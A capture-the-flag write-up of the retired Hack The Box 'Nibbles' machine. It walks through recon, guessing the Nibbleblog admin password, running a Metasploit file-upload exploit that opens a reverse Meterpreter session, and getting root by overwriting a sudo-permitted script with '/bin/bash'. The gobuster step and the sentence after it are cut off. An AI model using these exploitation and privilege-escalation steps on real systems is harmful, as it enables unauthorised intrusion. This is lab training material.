**Nibbles** is a retired **Easy** Linux box on Hack The Box. The foothold comes
from a hidden web application (Nibbleblog) running with weak admin credentials
and a known file-upload vulnerability. Privilege escalation is a writable script
that runs as root through a misconfigured sudo rule.

- **Target:** `10.129.60.224` (IP changes per spawn; recon was run against `10.129.83.140`)
- **OS:** Linux (Ubuntu 16.04, Apache 2.4.18)
- **Difficulty:** Easy

---

## Recon

Started with a full TCP port scan with version detection and default scripts:

```bash
nmap -sV -sC -oA nibbles -p- --min-rate 1000 10.129.83.140
```

- `-sV`: service/version detection
- `-sC`: default NSE scripts
- `-p-`: all 65,535 ports
- `-oA nibbles`: save output in all formats

![Nmap scan results for Nibbles](nibbles_nmap_scan.png)
_Two open ports: SSH and HTTP._

| Port | Service | Version |
|------|---------|---------|
| 22   | ssh     | OpenSSH 7.2p2 (Ubuntu) |
| 80   | http    | Apache httpd 2.4.18 (Ubuntu) |

SSH needs credentials I don't have, so port 80 is the entry point.

### Directory enumeration

gobuster dir -u http://10.129.83.140/nibbleblog/ \

The useful results are `admin.php` (the login panel) and `content/`, which

### Admin credentials

Nibbleblog stores user data in a world-readable XML file:

```bash
http://10.129.83.140/nibbleblog/content/private/users.xml
```

![users.xml exposing the admin username](username_enumeration.png)
_The file exposes the admin username._

The username is `admin`. The password is not stored here, but `nibbles`
(matching the box name) authenticates against the login panel. Confirm the
credentials work before running the exploit.

## Foothold: Nibbleblog File Upload

`searchsploit` returns a public exploit for the running version:

```bash
searchsploit nibbleblog
```

![searchsploit output for nibbleblog](nibbleblog_exploit.png)
_Nibbleblog 4.0.3 arbitrary file upload._

Nibbleblog 4.0.3 is vulnerable to authenticated arbitrary file upload. An admin
can upload a PHP file through the "My image" plugin with no validation, which
gives code execution.

### Exploitation

```bash
msfconsole
```

```text
use exploit/multi/http/nibbleblog_file_upload
set RHOSTS 10.129.60.224
set USERNAME admin
set PASSWORD nibbles
set TARGETURI /nibbleblog/
set LHOST tun0
set LPORT 4444
run
```

The module logs in as admin, uploads the payload, removes the uploaded file, and
opens a Meterpreter session.

> Set options after `use`. Values set at the bare `msf >` prompt land in the
> global datastore and may not carry into the module. Confirm with `show options`
> before running.
{: .prompt-warning }

> `TARGETURI` must be `/nibbleblog/`, not `/`. With the wrong path the module
> cannot find the login.
{: .prompt-info }

### Shell

Drop to a system shell and upgrade to a proper TTY:

```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> `shell` is a Meterpreter command, not a msfconsole command. It only works
> inside an active session.
{: .prompt-tip }

This lands a shell as `nibbler`.

## Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

```text
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

`nibbler` can run `monitor.sh` as root with no password. The script sits in
nibbler's own home directory, so we control its contents.

Unzip the archive, overwrite the script with a shell, and run it through sudo:

```bash
cd /home/nibbler
unzip personal.zip
echo '/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

![Root shell obtained and root flag read](priv_esc_root_flag.png)
_Root shell, root.txt readable._

> Run `sudo` with the full path from `sudo -l`. `./monitor.sh` runs as nibbler,
> and the sudo rule only matches the exact absolute path.
{: .prompt-info }

```bash
whoami
cat /root/root.txt
```

Rooted.

---

## Takeaways

- Check page source and world-readable files before attempting any exploit.
- Guess credentials from context (the box name) when they are not exposed.
- Always run `sudo -l`. A writable script that runs as root is a direct path to privilege escalation.
